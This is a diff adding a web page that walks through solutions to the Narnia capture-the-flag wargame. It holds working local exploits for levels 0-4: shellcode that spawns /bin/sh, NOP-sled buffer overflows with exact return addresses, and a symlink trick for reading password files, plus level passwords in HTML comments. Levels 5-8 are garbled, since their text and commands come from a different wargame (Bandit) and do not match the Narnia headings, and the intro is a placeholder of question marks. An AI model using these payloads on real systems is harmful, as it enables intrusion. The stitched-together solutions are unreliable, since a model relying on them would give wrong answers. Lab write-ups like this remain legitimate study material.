@@ -1,0 +1,250 @@
+---
+layout: default
+title: Narnia
+---
+
+            <!-- Intro -->
+            <section id="intro">
+                <img src="../images/projects/narnia.jpg" width="100%" height="250px" />
+                <header class="major">
+                    <h2>Narnia CTF</h2>
+                </header>
+                <a href="http://overthewire.org/wargames/narnia/">This OverTheWire CTF</a> is ?????????????????????????????????????????
+                <p>
+                    <h2 align="center"><b>########## WARNING: SPOILERS ##########</b></h2>
+                    <h2 align="center"><b>##### Scrolling down shows solutions for the Narnia CTF #####</b></h2>
+                </p>
+            </section>
+
+            <!--Content-->
+            <section>
+                <table>
+                    <tr>
+                        <td><a href="#narnia0">Narnia 00</a></td>
+                        <td><a href="#narnia1">Narnia 01</a></td>
+                        <td><a href="#narnia2">Narnia 02</a></td>
+                    </tr>
+                    <tr></tr>
+                        <td><a href="#narnia3">Narnia 03</a></td>
+                        <td><a href="#narnia4">Narnia 04</a></td>
+                        <td><a href="#narnia5">Narnia 05</a></td>
+                    </tr>
+                    <tr>
+                        <td><a href="#narnia6">Narnia 06</a></td>
+                        <td><a href="#narnia7">Narnia 07</a></td>
+                        <td><a href="#narnia8">Narnia 08</a></td>
+                    </tr>
+                </table>
+            </section>
+            
+            <!--Intro-->
+            <section>
+                <h3>Intro</h3>
+                All the challenges can be accessed with ssh. The syntax is the following:<br>
+                <code>ssh narniaX@narnia.labs.overthewire.org -p 2226</code><br>
+                The flags are in /etc/narnia_pass/narniaX. For each challenge we have execuable files and the corresponding sources in the /narnia/ folder.<br>
+                In the machine there are a couple of tools already installed, in particular PEDA: this is a gdb extension that shows registers, assembly and stack automatically, reducing a lot of the usual pain when using gdb. To start it, run gdb as usual and then source to the peda.py file:<br>
+                <pre class="brush: sh">
+                    gdb --args filetoinspect param1 param2
+                    > source /usr/local/peda/peda.py
+                </pre>
+            </section>
+            
+            
+            <!--Level00-->
+            <a name="narnia0"></a>
+            <section>
+                <h3>Narnia 00</h3>
+                <h4>ssh narnia0@narnia.labs.overthewire.org -p 2226<br>
+                Password: narnia0</h4>
+                This challenge is the simplest possible example of buffer overflow: we have a variable and a buffer declared just after one other, and if we write in the buffer more data than what it is supposed to hold the system will accept it and just go on and overwrite the memory that is actually assigned to the variable. For how the memory layout works you can check <a href="https://hackmethod.com/overthewire-narnia-0/">hellor00t writeup</a> for this same challenge.<br>
+                We start by passing as input a sequence of unique 4bytes, longer than the allocated buffer space: 'AAAABBBBCCCCDDDDEEEEFFFF'. The program tells us that the value of var is now 0x46464646, which is ASCII hex for FFFF. So now we know that our 0xDEADBEEF should come after exactly 20 characters (the stack has no fancy constructions in place, var and buffer are immediatly after one other). We only have to pay attention to the endianness of the bytes that we want.<br>
+                One last remark: after getting 0xDEADBEEF the shell closes immediately. To prevent this, we append the cat command to our input. The reason this happens? No idea, and Google tells to use this trick but can't explain why.
+                <br>
+                <pre class="brush: sh">
+                    (python -c  "print 'AAAA'*5 + '\xef\xbe\xad\xde'"; cat) | ./narnia0
+                </pre>
+                <!-- FLAG: efeidiedae -->
+            </section>   
+            
+            <!--Level01-->
+            <a name="narnia1"></a>
+            <section>
+                <h3>Narnia 01</h3>
+                <h4>ssh narnia1@narnia.labs.overthewire.org -p 2226</h4>
+                Looking at the source code, it seems that the program tries to execute what we set as the environment variable 'EGG'. Therefore we set is using <i>export EGG=...</i>. If we try to set the variable as a usual command, like whoami, we get a segfault, meaning that we tried to read or write at an illegal address in memory. What happens is that the program tries to actually execute what we stored in EGG, instead of calling that as a method.<br>
+                Therefore we need to put actual machine code instructions in the EGG variable: we aim to run shellcode, so that we will get a shell back and we will afterwards be able to run whatever we want. We can find a working shellcode in many websites, like <a href="http://shell-storm.org/">shell-storm.org</a>
+                <br>
+                <pre class="brush: sh">
+                        export EGG=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
+                        ./narnia1
+                        cat /etc/narnia_pass/narnia2
+                </pre>
+                <!-- FLAG: nairiepecu -->
+            </section> 
+
+            <!--Level02-->
+            <a name="narnia2"></a>
+            <section>
+                <h3>Narnia 02</h3>
+                <h4>ssh narnia2@narnia.labs.overthewire.org -p 2226</h4>
+                This time we have to overwrite the return address stored in the instruction pointer to be able to access the shell code that we put in the buffer.<br>
+                First of all, we need to know exactly how many bytes we have to write in the buffer so that our overflow will end up exactly revriting the $eip. To do this automagically, jason-rush wrote a nice <a href="http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/">EIP offset tool</a>: what the tool does is create a long string made of unique 4bytes elements. We have to pass the string in our target buffer (use gdb to see the info that we need), and if it's long enough it will generate a segfault. Gdb shows us the faulty $eip that we tried to access, and we just have to copy that value back in the tool to get how many bytes we have to write in the buffer to control the value of the $eip itself. In my case, to overwrite the $eip I have to provide 136 bytes.<br>
+                Our target payload has the following structure: <code>'\x90' * x + shellcode + return address</code>. The '\x90' corresponds to the nop instruction, and the x is the length of the overflow (136) minus the length of the shellcode (28) minus the lenth of the return address (4). The result is a nop sled of 104 bytes: our return address should aim to land somewhere within this slide, so that we don't have to be super precise trying to write the exact starting address of the shellcode in the return address, instead we will just slide down to it from wherever we land.<br>
+                However, we still have to find out where the nop sled will be. To do this, we craft our payload with the proper data and a bogus return address: after running it (in gdb) and ending up in a segfault, we look in the stack (with <i>x/250x $esp</i>) and search for the sequence of 0x90909090. As our return address we pick a location that is somewhere in the middle of the sequence, 0xFFFFD760 in my case.<br>
+                Now we exit gdb and build the proper payload (remember endianness): <code>'\x90' * 104 + shellcode + '\x60\xD7\xFF\xFF'</code>. Run narnia2 with this parameter, and enjoy the flag.
+                <br>
+                <pre class="brush: sh">
+                    ./narnia2 $(python -c "print '\x90' * 104 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x60\xd7\xff\xff'")
+                    cat /etc/narnia_pass/narnia3
+                </pre>
+                <!-- FLAG: vaequeezee -->
+            </section> 
+
+            <!--Level03-->
+            <a name="narnia3"></a>
+            <section>
+                <h3>Narnia 03</h3>
+                <h4>ssh narnia3@narnia.labs.overthewire.org -p 2226</h4>
+                This challenge is again a simple buffer overflow, but insted of overwriting the return address we aim to overwrite the output file: we wanto to be able to give the password file as input and have it printed at our own locatino instead that piped into /dev/null.<br>
+                We can see that by gving an input file longer than 32 bytes, the program complains that it can't open the output file with a name corresponding to the leftover bytes that we passed. From here the idea: the name of the input will contain the name of the output, from byte 33 onwards.<br>
+                We work in the /tmp folder, and start by creating a subfolder so that the length of the path will be exactly 32 bits: <i>/tmp/AAABBBCCCDDDEEEFFFGGGHHHIII</i> has the desired length. What follows will be part of the input paramter but also of the output file: that's the reason we create another subfolder called <i>tmp</i>, which will be read as <i>/tmp</i> for the output buffer. Then, we have to find a way to pass our target file, and we can do that by creating a symlink to it. The last step is to create an empty file with the same name of the symlink in the /tmp folder, and to give the proper permissions to it.<br>
+                The resulting <i>/tmp/AAABBBCCCDDDEEEFFFGGGHHHIII/tmp/olaola</i> is our input path, and the second part of it <i>/tmp/olaola</i> will overwrite the output.
+                <br>
+                <pre class="brush: sh">
+                    mkdir /tmp/AAABBBCCCDDDEEEFFFGGGHHHIII
+                    mkdir /tmp/AAABBBCCCDDDEEEFFFGGGHHHIII/tmp
+                    ln -s /etc/narnia_pass/narnia4 /tmp/AAABBBCCCDDDEEEFFFGGGHHHIII/tmp/olaola
+                    touch /tmp/olaola
+                    chmod 777 /tmp/olaola
+                    ./narnia3 /tmp/AAABBBCCCDDDEEEFFFGGGHHHIII/tmp/olaola
+                    cat /tmp/olaola                     
+                </pre>
+                <!-- FLAG: thaenohtai -->
+            </section>
+
+            <!--Level04-->
+            <a name="narnia4"></a>
+            <section>
+                <h3>Narnia 04</h3>
+                <h4>ssh narnia4@narnia.labs.overthewire.org -p 2226</h4>
+                This challenge is exactly the same as the level number 2. What we have to do is to find out how many bytes we need to send to take over the $eip, and then to check where we want our return address to point.<br>
+                After trying a few different lengths on gdb, for me the $eip overflow happens with 236 bytes. This means that we need 236 - 28 (shellcode) - 4 (return address) = 236 nop operations at the start of our payload.<br>
+                Running the payload with a bogus return address, we can check that when the segfault happens a good place to aim in the middle of the nop sled is 0xFFFFD6F0. This completes the construction of the payload.
+                <br>
+                <pre class="brush: sh">
+                    ./narnia4 $(python -c "print '\x90' * 236 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\xf0\xd6\xff\xff'")
+                    cat /etc/narnia_pass/narnia5
+                </pre>
+                <!-- FLAG: faimahchiy -->
+            </section>
+
+            <!--Level05-->
+            <a name="narnia5"></a>
+            <section>
+                <h3>Narnia 05</h3>
+                <h4>ssh narnia5@narnia.labs.overthewire.org -p 2226</h4>
+                First thing to say in this challenge is that we are really constrained to the declared 64 bytes of the buffer: the method used to read it is safe in that sense. However, we can pass the string formatting characters that will control a printf-like method.<br>
+                The printf can be exploited by convincing it to read or write for us stack values. This is possible because as soon as printf encounters a %x, %d or similar char it will pop data from the stack, blindly assuming that the corresponding values have been pushed into it beforehand. In our case no value has been pushed, so we access the stack directly. Using %n we can even write into the stack, as the popped value is treated as an address where to write the number of bytes written until that moment.
+                <table>
+                    <tr>
+                        <td>Parameters</td>
+                        <td>Output</td>
+                        <td>Passed as</td>
+                    </tr>
+                    <tr>
+                        <td>%%</td>
+                        <td>% character (literal)</td>
+                        <td>Reference</td>
+                    </tr>
+                    <tr>
+                        <td>%p</td>
+                        <td>External representation of a pointer to void</td>
+                        <td>Reference</td>
+                    </tr>
+                    <tr>
+                        <td>%d</td>
+                        <td>Decimal</td>
+                        <td>Value</td>
+                    </tr>
+                    <tr>
+                        <td>%c</td>
+                        <td>Character</td>
+                        <td></td>
+                    </tr>
+                    <tr>
+                        <td>%u</td>
+                        <td>Unsigned Decimal</td>
+                        <td>Value</td>
+                    </tr>
+                    <tr>
+                        <td>%x</td>
+                        <td>Hexadecimal</td>
+                        <td>Value</td>
+                    </tr>
+                    <tr>
+                        <td>%s</td>
+                        <td>String</td>
+                        <td>Reference</td>
+                    </tr>
+                    <tr>
+                        <td>%n</td>
+                        <td>Writes the number of characters into a pointer</td>
+                        <td>Reference</td>
+                    </tr>
+                </table>            
+                <br>
+                <pre class="brush: sh">
+                    ls -lah
+                    cd inhere
+                    find . -print -ls | grep 1033
+                    cat ./maybehere07/.file2
+                </pre>
+                <!-- FLAG:  -->
+            </section>
+
+            <!--Level06-->
+            <a name="narnia6"></a>
+            <section>
+                <h3>Narnia 06</h3>
+                <h4>ssh narnia6@narnia.labs.overthewire.org -p 2226</h4>
+                This time the file is 'somewhere on the server'. What we know is that is it is owned by user bandit7, owned by group bandit6 and 33 bytes in size.<br>
+                The approach is the same as the last challenge, we just pipe the output multiple times to filter it down.
+                <br>
+                <pre class="brush: sh">
+                    ls -lah
+                    cd /
+                    find . -print -ls | grep bandit7 | grep bandit6
+                    cat ./var/lib/dpkg/info/bandit7.password
+                </pre>
+                <!-- FLAG:  -->
+            </section>
+
+            <!--Level07-->
+            <a name="narnia7"></a>
+            <section>
+                <h3>Narnia 07</h3>
+                <h4>ssh narnia7@narnia.labs.overthewire.org -p 2226</h4>
+                We have a file containing a lot of data, but we know that our flag is stored next to the word 'millionth'. We can therefore cat the file and grep for the keyword.
+                <br>
+                <pre class="brush: sh">
+                    ls -lah
+                    cat data.txt | grep millionth
+                </pre>
+                <!-- FLAG:  -->
+            </section>
+
+            <!--Level08-->
+            <a name="narnia8"></a>
+            <section>
+                <h3>Narnia 08</h3>
+                <h4>ssh narnia8@narnia.labs.overthewire.org -p 2226</h4>
+                Again a file with lot of data, and the only hint is that our flag is the only one appearing exactly once.<br>
+                What we do is use the command <i>sort</i> to output the content of data.txt in alphabetical order, and then pipe this output to the command <i>uniq</i>. By giving the -u parameter to uniq, the output will be the only line that is not repeated. To note is that uniq only works on adjacent lines (meaning sorted input).
+                <br>
+                <pre class="brush: sh">
+                    ls -lah
+                    sort data.txt | uniq -u
+                </pre>
+                <!-- FLAG:  -->
+            </section>
